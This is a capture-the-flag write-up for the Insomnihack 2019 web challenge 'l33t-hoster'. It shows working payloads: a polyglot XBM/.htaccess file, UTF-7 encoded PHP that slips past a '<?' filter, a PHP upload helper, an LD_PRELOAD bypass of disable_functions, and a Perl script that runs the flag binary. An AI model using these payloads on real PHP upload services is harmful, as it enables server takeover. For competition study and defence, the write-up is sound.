# l33t-hoster
*Insomnihack CTF 2019 Web 137*<br>
*Writeup by Payload, KAIST GoN*


## Problem

You can host your l33t pictures here.

![Index](https://i.imgur.com/mzpqJO4.png)

[here](http://35.246.234.136)<br>
[source](./server/index.php)

## Look up

In main page, we can find one of upload form. Also, we can find a comment in html `<!-- /?source -->`. Let's check some parts of source.

```php
$disallowed_ext = array( "php", "php3", "php4", "php5", "php7", "pht", "phtm", "phtml", "phar", "phps");


if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}
```

Now, we know the server's upload procedures.

* Deny if file name is only extension. (like `.htaccess`, `.txt`)
* Deny if file has disallowed extension.
* Deny if `<?` is included in file contents.
* Deny if file can't pass `exif_imagetype` 
* Deny if not `getimagesize` returns `1337 * 1337`
* Else, copy file to your own folder

Well, since this is a PHP problem, maybe flag is in its root directory, we should make LFI or RCE vulnerability. How?<br>
Let's make PHP to run our files :D 

## exif_imagetype(), getimagesize() and .htaccess

First, to attack the server, we must upload new .htaccess to run PHP with our own extensions.<br>
But, how can we upload file with name `.htaccess`?<br>
We can focus only shift array **once** when first exploded parts is empty.<br>
So, when we make file nams as `..htaccess`, it will be successfuly uploaded as `.htaccess`!

However, `exif_imagetype` functions check first some bytes that is valid image's magic number, we have to fake it.<br>
In other words, we should make a file both satisfies image's magic number and .htaccess grammer.

However, we already know well-known image files such as `.png`, `.jpg` can't build valid .htaccess because of magic number. Thus, I checked [PHP reference](http://php.net/manual/en/function.exif-imagetype.php) and found a strange file, `.xbm`.

![exif_imagetype imagetypes](https://i.imgur.com/oxWAcA6.png)

I converted my sample image to xbm file, and GOTCHA!<br>
Below is **valid** xbm file header, which passes `exif_imagetype` and `getimagesize`
```
#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
#define 4c11f3876d494218ff327e3ca6ac824f_height 1337
```

You got it?<br>
Since both lines are starting with `#`, it will be interpreted as comment!<br>
So, below is valid xbm file passes size check, and also .htaccess file!
```.htaccess
#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
#define 4c11f3876d494218ff327e3ca6ac824f_height 1337
AddType application/x-httpd-php .asp
```

## Run PHP without `<?`

Now, we know how to upload our own .htaccess, now it's time to upload valid PHP file.<br>
It's too easy when you have XSS experiences, just use another encoding type such as `UTF-7`.<br>
Since we can control .htaccess, we can define server's encoding, PHP file with UTF-7 will be run!<br>
I changed my [.htaccess](./..htaccess) and uploaded [phpinfo.asp](./phpinfo.asp) that shows `phpinfo()` :P


```.htaccess
#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
#define 4c11f3876d494218ff327e3ca6ac824f_height 1337
AddType application/x-httpd-php .asp
php_flag display_errors on
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```

```php
#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
#define 4c11f3876d494218ff327e3ca6ac824f_height 1337
+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs
```

## Get a shell!

Now we know how to run php. Let's find the flag!<br>
I uploaded the [scanroot.asp](./scanroot.asp) that scan the root directory using `scandir` function.<br>
We can find two files, `flag` and `get_flag`. A few moment later, we can know the goal of this problem is get a shell and launch `get_flag`
![Root directory](https://i.imgur.com/Ogoy6OC.png)

By the way, `phpinfo()` gives us important information, `disable_functions`.<br>
```
disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,posix_mkfifo, pg_lo_import, dbmopen, dbase_open, popen, chgrp, chown, chmod, symlink,apache_setenv,define_syslog_variables, posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_uname, proc_close, pclose, proc_nice, proc_terminate,curl_exec,curl_multi_exec,parse_ini_file,show_source,imap_open,fopen,copy,rename,readfile,readlink,tmpfile,tempnam,touch,link,file_put_contents,file,ftp_connect,ftp_ssl_connect,
```
Important functions to get a shell like `system`, `shell_exec`, `proc_open` are blocked, we must bypass it.<br>
I googled about bypassing, I found a method using [LD_PRELOAD injection!](https://www.freebuf.com/articles/web/192052.html)<br>
Also, I noticed that `mail` and `putenv` functions are not disabled, we may be able to use **LD_PRELOAD injection**

I built `bypass.so` and `shell.php` like in reference, it should be work :)

## Upload the file...

We thought we just solved a problem, because we can get a shell!<br>
However, there was a huge wall... How can we upload a valid `.so` file?<br>
Since we must pass `exif_imagetype`, we can't make a valid `.so` file also valid image file...

After long rest, I just found `move_uploaded_file` is not disabled due to configure main page!<br>
So, I just write simple upload form and php file deals with upload, [up_form.html](./up_form.html) and [upl.asp](./upl.asp)

```html
#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
#define 4c11f3876d494218ff327e3ca6ac824f_height 1337
<form method="POST" action="upl.asp" enctype="multipart/form-data">
    <input type="file" name="image">
	<input type="text" name="name">
    <input type="submit" name=upload>
</form>
```

```php
#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
#define 4c11f3876d494218ff327e3ca6ac824f_height 1337
+ADw?php
if (isset(+ACQAXw-POST+AFsAIg-upload+ACIAXQ)) +AHs
    +ACQ-tmp+AF8-name +AD0 +ACQAXw-FILES+AFsAIg-image+ACIAXQBbACI-tmp+AF8-name+ACIAXQA7
    move+AF8-uploaded+AF8-file(+ACQ-tmp+AF8-name, +ACQAXw-POST+AFsAIg-name+ACIAXQ)+ADs
+AH0
?+AD4-
```

Now, we can bypass any filter of main upload form!<br>
New files are not forced be image or not include `<?`.<br>
Thus, we can upload our backdoor `.so` file and shell `.php` file.<br>
In addition, we can easily know the web root is `/var/www/html`, we can run our `shell.php`<br>

Great, now we got a shell!
![ls -al](https://i.imgur.com/rAPaSMZ.png)


## Wait, captcha?

Now, we thought just running `/get_flag` gives us a flag.<br>
But, when we tried running `/get_flag`, it gives a simple captcha that is addition of 5 numbers.<br>
![Captcha](https://i.imgur.com/rmjNPAY.png)

We have to deal with the pipes!

Firstly, we just tried reverse shell.<br>
With some tries on our shell, we found that python, gcc is not available, but perl is<br>
But, with some problem, SIGALRM is triggered too fast, we couldn't deal with the captcha :(

So we decided to deal standalonely, without reverse shell<br>
After some search, we found that there is a feature to process pipe in child process in perl, `IPC`.<br>
We wrote a perl script to spawn `/get_flag`, solve the captcha, and get flag

```perl
#!/usr/bin/env perl 
use warnings;
use strict;
use IPC::Open2;

$| = 1;

my $pid = open2(\*out2, \*in2, '/get_flag') or die;

my $reply = <out2>;
print STDOUT $reply; #string: solve captcha..
$reply = <out2>;
print STDOUT $reply; #captcha formula

my $answer = eval($reply);
print STDOUT "answer: $answer\n"; 

print in2 " $answer "; #send it to process
in2->flush();

$reply = <out2>;
print STDOUT $reply; #flag :D
```

## Why no flag?

![stream error](https://i.imgur.com/xHQ6DZ5.png)

But, we weren't able to get a flag.<br>
The last line which should print the flag gives us error.<br>
So we downloaded the [binary file](./server/get_flag) and analyzed.

![binary](https://i.imgur.com/pedOtRZ.png)

We discovered `get_flag` binary is openning `flag` not `/flag`, so problem was about cwd(current working directory).<br>
Finally, we add `chdir` in [final perl script](./exploit.pl), run using uploaded shell, then got a flag :D

```perl
#!/usr/bin/env perl 
use warnings;
use strict;
use IPC::Open2;

$| = 1;
chdir "/"; #!!!!!!!!!!!!!!!!!!!!!!!!!!

my $pid = open2(\*out2, \*in2, './get_flag') or die;

my $reply = <out2>;
print STDOUT $reply; #string: solve captcha..
$reply = <out2>;
print STDOUT $reply; #captcha formula

my $answer = eval($reply);
print STDOUT "answer: $answer\n"; 

print in2 " $answer "; #send it to process
in2->flush();

$reply = <out2>;
print STDOUT $reply; #flag :D
```

![FLAG](https://i.imgur.com/M9eJaQe.png)


**`INS{l33t_l33t_l33t_ich_hab_d1ch_li3b}`**
